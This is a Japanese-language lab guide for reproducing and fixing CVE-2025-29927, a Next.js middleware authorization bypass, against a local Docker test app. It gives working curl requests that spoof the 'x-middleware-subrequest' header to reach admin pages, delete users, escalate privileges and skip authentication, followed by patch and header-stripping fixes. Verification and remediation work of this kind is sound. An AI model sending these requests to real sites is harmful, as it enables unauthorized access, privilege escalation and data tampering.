# CVE-2025-29927: Next.jsミドルウェアバイパス脆弱性の検証手順

## 概要

**CVE-2025-29927**は、Next.jsのミドルウェアにおける認証・認可バイパス脆弱性です。

### 脆弱性の詳細

- **CVE ID**: CVE-2025-29927
- **脆弱性タイプ**: Middleware Authorization Bypass
- **CVSS スコア**: 9.1 (Critical)
- **影響を受けるバージョン**: 
  - Next.js 11.1.4 ~ 13.5.6
  - Next.js 14.x < 14.2.25
  - Next.js 15.x < 15.2.3
- **修正バージョン**: 12.3.5, 13.5.9, 14.2.25, 15.2.3以降

### 脆弱性の原因

Next.jsは内部的に`x-middleware-subrequest`ヘッダーを使用して、無限ループを防止しています。しかし、このヘッダーの送信元を検証せずに信頼してしまうため、攻撃者がこのヘッダーを偽装することで、ミドルウェアの処理を完全にスキップできます。

```typescript
// Next.js内部の脆弱な処理（簡略化）
if (request.headers.get('x-middleware-subrequest')) {
    // ミドルウェアをスキップして直接ルートハンドラへ
    return handleRoute(request);
}
```

## 検証環境のセットアップ

### 前提条件

- Docker と Docker Compose がインストールされていること
- ポート3000が利用可能であること
- curlコマンドが使用可能であること

### 1. データベースの準備

まず、`isAdmin`フィールドを追加するためのマイグレーションを実行します:

```bash
# コンテナ内でマイグレーションを実行
docker compose exec web-app bunx prisma migrate dev --name add_is_admin
```

または、コンテナを再ビルドする際に自動的にマイグレーションが実行されます:

```bash
docker compose down
docker compose up --build
```

### 2. 管理者アカウントの作成

通常のユーザーアカウントを作成した後、データベースを直接編集して管理者権限を付与します:

```bash
# コンテナ内のシェルに入る
docker compose exec web-app sh

# Prisma Studioを起動（別の方法）
bunx prisma studio

# または、SQLiteを直接編集
sqlite3 /app/dev.db
```

SQLiteで直接編集する場合:

```sql
-- ユーザー一覧を確認
SELECT id, email, isAdmin FROM user;

-- 特定のユーザーを管理者にする
UPDATE user SET isAdmin = 1 WHERE email = 'your-email@example.com';

-- 確認
SELECT id, email, isAdmin FROM user;

-- 終了
.quit
```

### 3. アプリケーションの起動確認

```bash
# アプリケーションが起動していることを確認
docker compose ps

# ログを確認
docker compose logs -f web-app
```

## 脆弱性の検証

### テスト1: 正常なアクセス（管理者）

まず、管理者アカウントでログインして、正常に`/admin`ページにアクセスできることを確認します:

1. http://localhost:3000 にアクセス
2. 管理者アカウントでログイン
3. http://localhost:3000/admin にアクセス
4. 「✅ Access Granted - Admin Only Area」が表示されることを確認

### テスト2: 正常なアクセス拒否（非管理者）

次に、非管理者アカウントでアクセスが拒否されることを確認します:

1. 別のブラウザまたはシークレットモードで http://localhost:3000 にアクセス
2. 非管理者アカウントでログイン（`isAdmin = 0`のユーザー）
3. http://localhost:3000/admin にアクセス
4. トップページにリダイレクトされることを確認

### テスト3: ミドルウェアバイパス攻撃（CVE-2025-29927）

非管理者のセッションCookieを使用して、`x-middleware-subrequest`ヘッダーを追加することで、管理者ページにアクセスできることを確認します:

```bash
# 非管理者のセッションCookieを取得（ブラウザの開発者ツールから）
# 以下のコマンドで管理者ページにアクセス

curl -v \
  -H "x-middleware-subrequest: 1" \
  -H "Cookie: better-auth.session_token=<non-admin-session-token>" \
  http://localhost:3000/admin
```

**期待される動作（脆弱な場合）:**
- ミドルウェアがバイパスされる
- 管理者権限チェックがスキップされる
- 非管理者でも管理者ページのコンテンツが表示される
- レスポンスに「✅ Access Granted - Admin Only Area」が含まれる

### テスト4: ヘッダーなしでのアクセス（比較用）

同じ非管理者のセッションCookieで、`x-middleware-subrequest`ヘッダーなしでアクセスすると、正常にブロックされることを確認:

```bash
curl -v \
  -H "Cookie: better-auth.session_token=<non-admin-session-token>" \
  http://localhost:3000/admin
```

**期待される動作:**
- ミドルウェアが正常に動作
- トップページへのリダイレクト（302）
- または「Access Denied」メッセージ

### テスト5: 認証なしでのバイパス

セッションCookieなしでも、`x-middleware-subrequest`ヘッダーを使用すると、認証自体をバイパスできる可能性があります:

```bash
curl -v \
  -H "x-middleware-subrequest: 1" \
  http://localhost:3000/admin
```

> [!WARNING]
> Next.jsのバージョンや実装によっては、このテストで完全な認証バイパスが可能な場合があります。

## 攻撃シナリオ

### シナリオ1: 管理者機能への不正アクセス

攻撃者が一般ユーザーアカウントを作成し、`x-middleware-subrequest`ヘッダーを使用して管理者専用機能にアクセス:

```bash
# 1. 一般ユーザーとしてログイン
# 2. セッションCookieを取得
# 3. 管理者APIに不正アクセス

curl -X POST \
  -H "x-middleware-subrequest: 1" \
  -H "Cookie: better-auth.session_token=<user-token>" \
  -H "Content-Type: application/json" \
  -d '{"action": "delete_user", "userId": "target-user-id"}' \
  http://localhost:3000/api/admin/users
```

### シナリオ2: 認証の完全バイパス

認証が必要なAPIエンドポイントに、認証なしでアクセス:

```bash
# セッションCookieなしで保護されたAPIにアクセス
curl -H "x-middleware-subrequest: 1" \
     http://localhost:3000/api/user/profile
```

### シナリオ3: 権限昇格

一般ユーザーが自分自身を管理者に昇格:

```bash
curl -X PATCH \
  -H "x-middleware-subrequest: 1" \
  -H "Cookie: better-auth.session_token=<user-token>" \
  -H "Content-Type: application/json" \
  -d '{"isAdmin": true}' \
  http://localhost:3000/api/user/update
```

## 脆弱性の影響

- ✅ 認証の完全バイパス
- ✅ 認可チェックのスキップ
- ✅ 管理者専用機能への不正アクセス
- ✅ 権限昇格
- ✅ 内部専用機能の露出
- ✅ データ漏洩・改ざん

## 検証のポイント

### ミドルウェアのログを確認

[middleware.ts](file:///Users/azkineri/Documents/Workspace/ssrfTest/middleware.ts)には、`x-middleware-subrequest`ヘッダーを検出するログが含まれています:

```bash
# コンテナのログを監視
docker compose logs -f web-app

# x-middleware-subrequest ヘッダー付きでリクエストを送信
curl -H "x-middleware-subrequest: 1" \
     -H "Cookie: better-auth.session_token=<token>" \
     http://localhost:3000/admin

# ログに以下のメッセージが表示されるか確認
# ⚠️ CVE-2025-29927: x-middleware-subrequest header detected - middleware may be bypassed!
```

### レスポンスの比較

```bash
# ヘッダーなし（正常）
curl -s -H "Cookie: better-auth.session_token=<non-admin-token>" \
     http://localhost:3000/admin | grep "Access"

# ヘッダーあり（バイパス）
curl -s -H "x-middleware-subrequest: 1" \
     -H "Cookie: better-auth.session_token=<non-admin-token>" \
     http://localhost:3000/admin | grep "Access"
```

## 修正方法

### 方法1: Next.jsのアップグレード（推奨）

```json
// package.json
{
  "dependencies": {
    "next": "14.2.25"  // または 15.2.3以降
  }
}
```

```bash
npm install
```

### 方法2: ミドルウェアでヘッダーを除去

```typescript
// middleware.ts
export default async function authMiddleware(request: NextRequest) {
    // 外部からの x-middleware-subrequest ヘッダーを除去
    const headers = new Headers(request.headers);
    headers.delete('x-middleware-subrequest');
    
    // 新しいヘッダーでリクエストを再構築
    const newRequest = new NextRequest(request.url, {
        headers,
        method: request.method,
    });
    
    // 通常の認証処理
    // ...
}
```

### 方法3: リバースプロキシでのヘッダーフィルタリング

```nginx
# Nginxの設定例
location / {
    # 危険なヘッダーを除去
    proxy_set_header x-middleware-subrequest "";
    proxy_pass http://nextjs-app:3000;
}
```

### 方法4: Vercelへのデプロイ

VercelにデプロイされたNext.jsアプリケーションは、このCVEの影響を受けません（Vercelのインフラストラクチャが保護している）。

## トラブルシューティング

### 管理者ページにアクセスできない

```bash
# データベースを確認
docker compose exec web-app sqlite3 /app/dev.db "SELECT id, email, isAdmin FROM user;"

# isAdminフィールドが存在しない場合
docker compose exec web-app bunx prisma migrate dev --name add_is_admin
docker compose restart web-app
```

### ミドルウェアバイパスが動作しない

- Next.jsのバージョンを確認（14.1.1は脆弱）
- ミドルウェアが正しく設定されているか確認
- ヘッダー名のスペルミスがないか確認（`x-middleware-subrequest`）

### セッションCookieが無効

```bash
# 新しいセッションを作成
# 1. ブラウザでログアウト
# 2. 再度ログイン
# 3. 新しいセッションCookieを取得
```

## 参考情報

- **CVE詳細**: https://nvd.nist.gov/vuln/detail/CVE-2025-29927
- **CVSS スコア**: 9.1 (Critical)
- **CWE-863**: Incorrect Authorization
- **Next.js Security Advisory**: https://github.com/vercel/next.js/security/advisories

## 関連する脆弱性

このリポジトリでは、以下の脆弱性も検証できます:

- [CVE-2025-57822](file:///Users/azkineri/.gemini/antigravity/brain/544e050b-18e6-4621-ae73-0e86f1c4c5cc/CVE-2025-57822-verification.md): SSRF脆弱性
